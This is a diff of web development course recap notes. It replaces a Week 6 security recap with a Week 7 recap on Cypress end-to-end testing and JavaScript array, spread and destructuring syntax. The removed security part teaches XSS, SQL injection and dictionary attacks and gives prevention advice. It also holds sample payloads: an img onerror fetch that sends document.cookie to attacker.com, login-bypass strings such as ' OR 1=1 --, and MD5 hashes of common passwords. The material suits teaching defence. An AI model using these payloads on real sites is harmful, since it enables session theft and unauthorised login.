@@ -1,137 +1,138 @@
-Recap from Week 6
-(delivered at Week 7)
-
-
-Never trust user input!
-This is the golden rule to prevent many attacks.
-
-Hackers & Their Intent:
-- Black-Hat:
-Malicious intent, no permission (e.g., stealing data).
-
-- White-Hat:
-Ethical hackers with permission (e.g., penetration testing).
-
-- Gray-Hat:
-Good intent but no permission (e.g., hacking to expose flaws).
-
-
-Penetration Testing
-Simulated attacks to find vulnerabilities
-
-- Authorized & Legal.
-- Mimics Real Attacks.
-- Provides Fixes.
-
-Exploit is a software, code, or a technique
-that takes advantage of a vulnerability.
-
-https:www.exploit-db.com/
-https:www.cvedetails.com/
-
-
-Zero-Day Exploits
-Unknown vulnerabilities with no patch yet.
-The most dangerous!
-
-Famous Zero-Day Exploits
-
-- WannaCry (2017) Ransomware encrypted 200,000+
-- SolarWinds (2020) compromised software updates
-- Log4Shell (2021) remote code execution via text
-
-Protection Measures
-
-- Update software regularly.
-- Use security tools (EDR/XDR).
-- Sanitize all user inputs.
-- Limit attack surface.
-
-
-Cookies
-A small data (hash) stored in your browser.
-
-- Login sessions
-- Preferences
-- Tracking
-
-Cookies can be stolen via XSS
-and attackers can impersonate users.
+Recap from Week 7
+(delivered at Week 8)
 
 
 
-XSS (Cross-Site Scripting)
+Test Coverage
 
-Occurs when an attacker injects
-malicious scripts into a web application.
+- Measures % of code tested.
+- High coverage doesn't mean bug-free.
 
-Possible if you use .innerHTML
-with not sanitized user input.
+Testing Pyramid
+
+- Unit Tests (functions)
+- Integration Tests (modules)
+- E2E Tests (whole app)
+
+E2E Testing
+Validates real user flows.
+Use Cypress for automation
+
+Install Cypress
+npm init -y
+npm install cypress --save-dev
+npx cypress open
+
+Cypress
+
+Uses describe() and it() syntax
+similar to Jasmine.
+
+Always start tests by visiting
+the page with cy.visit()
+
+Element Selection:
+
+cy.contains(text)
+
+- cy.contains('focus link') -> finds first
+element containing text (fails if not found)
+
+cy.get(selector)
+
+- cy.get('#username') -> by ID
+- cy.get('.btn-submit') -> by class
+- cy.get('input[type="text"]') -> by attribute
+
+Interactions:
+
+.click() - Clicks an element
+.type(text) - Enters text into input fields
+.clear() - Clears input fields
+.submit() - Submits forms
+
+Assertions:
+
+.should()
+.expect()
+.assert()
+
+Common .should() assertions:
+
+.should('be.visible')
+.should('have.value') -> for inputs and exact match
+.should('contain') -> for DOM elements, not exact
+.should('have.class')
+.should('have.focus')
+
+Best Practices:
+
+Use beforeEach() to avoid repeating
+setup code (like cy.visit())
+
+Example
+
+describe('Homepage Tests', () => {
+    beforeEach(() => cy.visit('/'));
+    it('should display the header', () => {
+        cy.get('h1').should('contain', 'Welcome');
+    });
+    it('should have a working search bar', () => {
+       cy.get('#search').type('Cypress').should('have.value', 'Cypress');
+    });
+});
 
 
-Malicious input:
-
-<img src='fake' onerror='alert("You are hacked now!")'>
-<a href="javascript:alert('You are hacked again!')">Click me</a>
-<img src='x' onerror=
-'fetch("https://attacker.com/steal
-?cookie_stolen="+encodeURIComponent(document.cookie))'>
-
-Prevention
-
-- Use `textContent`
-- Sanitize input with JS
-- Add CSP header:
-<meta http-equiv="Content-Security-Policy"
-content="default-src 'self'">
 
 
-Form Validation Bypass
 
-Client-side validation can be easily bypassed.
-Rely only on backend validation.
+Array methods
 
-Dictionary Attacks
-
-Using precomputed hashes to crack passwords.
-
-Example:
-
-123456:    e10adc3949ba59abbe56e057f20f883e
-password:  5f4dcc3b5aa765d61d8327deb882cf99
-qwerty:    d8578edf8458ce06fbc5bb76a58c5ca4
-abc123:    e99a18c428cb38d5f260853678922e03
-11111:     96e79218965eb72c92a549dd5a330112
-foo:       d3b07384d113edec49eaa6238ad5ff00
-
-https://hashes.com/en/decrypt/hash
+[1, 2, 3, 4].forEach(num => console.log(num)) -> 1, 2, 3, 4
+[1, 2, 3, 4].slice(1, 3) -> [2, 3]
+[1, 2, 3, 4].slice() -> [1, 2, 3, 4]
+[1, 2, 3, 4].map(num => num * 2) -> [2, 4, 6, 8]
+[1, 2, 3, 4].filter(num => num > 2) -> [3, 4]
+[1, 2, 3, 4].some(num => num > 2) -> true
+[1, 2, 3, 4].some(num => num > 4) -> false
+[1, 2, 3, 4].find(num => num > 1) -> 2
 
 
-SQL Injection
+Spread operator (...)
 
-Injecting SQL code to manipulate databases.
+Copying
+const originalArray = [1, 2, 3];
+[ ...originalArray ] -> [1, 2, 3]
 
-- Bypass authentication.
-- Steal, modify, or delete data in DB.
-- Execute admin-level operations.
+originalObject = { name: 'John' };
+{ ...originalObject } -> { name: 'John' }
 
-Example to bypass login:
+Merging
+const array1 = [1, 2, 3];
+const array2 = ['a', 'b', 'c'];
+[ ...array1, ...array2 ] -> [1, 2, 3, 'a', 'b', 'c']
 
-' OR 1=1 --
-admin' --
+const object1 = { a: 1, b: 2 };
+const object2 = { c: 3, d: 4 };
+{ ...object1, ...object2 } -> { a: 1, b: 2, c: 3, d: 4 }
 
-SELECT * FROM users
-    WHERE username = 'admin' -- '
-    AND password = '';
-
-In SQL comment (--) tells to ignore
-anything after it.
+Passing arguments
+const sum = (a, b, c) => a + b + c;
+const arguments = [1, 2, 3];
+sum(...arguments) -> 6
 
 
-Prevention:
 
-- Use parameterized queries
-- sanitize inputs.
+Object destructuring
 
-Remember:
-Never trust user input!
+const person = { name: 'Alice', age: 25, city: 'Wonderland' };
+const { name, age, city } = person;
+
+In function arguments
+
+function greet({ name, age }) {
+     console.log(`Hello, ${name}! You are ${age} years old.`);
+}
+const person = { name: 'Alice', age: 25, city: 'Wonderland' };
+greet(person);
+
